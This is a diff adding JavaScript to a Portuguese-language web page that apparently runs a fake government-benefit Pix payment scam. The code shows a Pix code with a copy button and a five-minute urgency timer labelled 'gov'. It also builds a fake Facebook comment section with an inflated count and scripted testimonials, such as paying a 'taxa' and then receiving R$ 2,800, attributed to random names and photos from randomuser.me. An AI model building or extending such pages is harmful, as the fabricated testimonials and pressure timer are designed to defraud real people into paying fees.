+        btn.innerHTML = '<i class="fas fa-check"></i><span>CÓDIGO COPIADO!</span>';
+        btn.classList.add('ok');
+        setTimeout(function(){ btn.innerHTML = orig; btn.classList.remove('ok'); }, 3000);
+      }
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(_pixCode).then(ok).catch(function(){ _fbCopy(); ok(); });
+      } else { _fbCopy(); ok(); }
+    }
+    function _fbCopy() {
+      var el = document.createElement('textarea');
+      el.value = _pixCode;
+      el.style.cssText = 'position:fixed;opacity:0;top:0;left:0;';
+      document.body.appendChild(el); el.focus(); el.select();
+      try { document.execCommand('copy'); } catch(e) {}
+      document.body.removeChild(el);
+    }
+    function pixToggle(hd) {
+      var bd = hd.nextElementSibling;
+      var ic = hd.querySelector('i');
+      ic.style.transform = bd.classList.toggle('open') ? 'rotate(0deg)' : 'rotate(180deg)';
+    }
+
+    // ===================================================
+    // TIMER 5 MINUTOS
+    // ===================================================
+    var _timerSecs = 5 * 60; // 5 minutos
+    var _timerInterval = null;
+
+    function pixIniciarTimer() {
+      if (_timerInterval) clearInterval(_timerInterval);
+      _timerSecs = 5 * 60;
+      // Mostra a barra
+      var bar = document.getElementById('gov-timer-bar');
+      if (bar) bar.classList.add('visivel');
+      _atualizarTimer();
+      _timerInterval = setInterval(function() {
+        _timerSecs--;
+        _atualizarTimer();
+        if (_timerSecs <= 0) {
+          clearInterval(_timerInterval);
+          pixIniciar(); // Gera novo PIX
+        }
+      }, 1000);
+    }
+
+    function _atualizarTimer() {
+      var m = Math.floor(_timerSecs / 60);
+      var s = _timerSecs % 60;
+      var mEl = document.getElementById('gov-timer-m');
+      var sEl = document.getElementById('gov-timer-s');
+      var bar = document.getElementById('gov-timer-bar');
+      if (!mEl) return;
+
+      mEl.textContent = (m < 10 ? '0' : '') + m;
+      sEl.textContent = (s < 10 ? '0' : '') + s;
+
+      // Estados visuais
+      bar.classList.remove('urgente', 'critico');
+      if (_timerSecs <= 60) {
+        bar.classList.add('critico');
+      } else if (_timerSecs <= 120) {
+        bar.classList.add('urgente');
+      }
+    }
+
+    // ===================================================
+    // COMENTÁRIOS
+    // ===================================================
+    var totalComments = 25738;
+    var storedComments = [];
+
+    function initFacebookComments() {
+      document.getElementById('fb-header-outside').textContent = 'Comentários (' + totalComments + ')';
+      var local = localStorage.getItem('commentsData');
+      if (local) {
+        storedComments = JSON.parse(local);
+        storedComments.forEach(function(c){ createComment(c.name, c.avatar, c.text, c.likes, c.dislikes, false); });
+        document.getElementById('fb-comment-count').textContent = 'Comentários: ' + totalComments;
+        document.getElementById('fb-loading').textContent = 'Comentários atualizados.';
+        scheduleComments();
+      } else {
+        generateInitialComments();
+      }
+    }
+    function generateInitialComments() {
+      ['Tive medo, mas entrou R$ 2.400!','Tive que pagar taxa, mas veio R$ 2.800 em 10min','Recebi R$ 4.000 deu para pagar as contas kkk']
+        .forEach(function(t){ createRandomComment(t, true); });
+      document.getElementById('fb-comment-count').textContent = 'Comentários: ' + totalComments;
+      document.getElementById('fb-loading').textContent = 'Comentários atualizados.';
+      scheduleComments();
+      saveCommentsToLocal();
+    }
+    function scheduleComments() {
+      ['Alguém conseguiu R$ 2.700 hoje?','Meu Pix foi aprovado e caiu R$ 3.500 em 5 min!','Testei hoje e entrou R$ 2.100 rapidinho!','Show! Liberou R$ 4.250 e já usei tudo!','Recebi R$ 5.000, só precisei pagar a taxa']
+        .forEach(function(msg, i){
+          setTimeout(function(){
+            document.getElementById('fb-loading').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Carregando comentários';
+            createRandomComment(msg, false);
+            document.getElementById('fb-loading').textContent = 'Comentários atualizados.';
+          }, (i+1)*10000);
+        });
+    }
+    async function createRandomComment(text, initial) {
+      totalComments++;
+      var ud = await getRandomUser();
+      createComment(ud.name.first, ud.picture.medium, text, 0, 0, initial);
+      storedComments.unshift({ name: ud.name.first, avatar: ud.picture.medium, text: text, likes: 0, dislikes: 0 });
+      if (!initial) saveCommentsToLocal();
+    }
+    function createComment(name, avatar, text, likes, dislikes, initialLoad) {
+      var el = document.createElement('div');
+      el.classList.add('comment-item');
+      el.innerHTML = '<img class="comment-avatar" src="'+avatar+'" alt="avatar"/>' +
+        '<div class="comment-content"><div class="comment-name">'+name+'</div>' +
+        '<div class="comment-text">'+text+'</div>' +
+        '<div class="comment-actions"><span class="comment-likes"><i class="fas fa-thumbs-up"></i> '+likes+'</span>' +
+        '<span class="comment-dislikes"><i class="fas fa-thumbs-down"></i> '+dislikes+'</span></div></div>';
+      var c = document.getElementById('fb-comments-container');
+      c.insertBefore(el, c.firstChild);
+      if (!initialLoad) saveCommentsToLocal();
+    }
+    async function getRandomUser() {
+      var r = await fetch('https://randomuser.me/api/?nat=br');
+      return (await r.json()).results[0];
+    }
+    function saveCommentsToLocal() {
+      localStorage.setItem('commentsData', JSON.stringify(storedComments));
+    }
+
+    // ===================================================
+    // INICIALIZA
+    // ===================================================
+    initFacebookComments();
+    pixIniciar();
+  </script>
+
+</body>
+</html>
